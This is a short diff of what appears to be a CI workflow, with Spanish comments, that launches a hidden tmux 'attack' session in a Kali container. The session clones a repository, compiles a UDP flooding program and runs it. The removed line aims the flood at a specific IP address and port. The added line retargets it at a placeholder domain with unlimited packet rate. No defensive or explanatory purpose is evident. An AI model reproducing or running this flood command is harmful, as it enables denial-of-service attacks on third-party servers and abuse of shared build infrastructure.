@@ -31,7 +31,7 @@ jobs:
           echo "### Enviando secuencia de ataque a la sesión oculta..."
           # El 'C-m' es como presionar ENTER.
           docker exec kali tmux send-keys -t attack \
-            "git clone https://github.com/feloxgarcia0-stack/UDP2.git /root/attack && cd /root/attack && javac UDPMaxFlood.java && java UDPMaxFlood 51.81.59.76 21545 1472 8 18000 " C-m
+            "git clone https://github.com/feloxgarcia0-stack/UDP2.git /root/attack && cd /root/attack && javac UDPMaxFlood.java && java UDPMaxFlood ejemplo.es 12345 1472 8 -pps 0" C-m
 
           # --- La misión está en curso. Ahora te damos acceso. ---
           
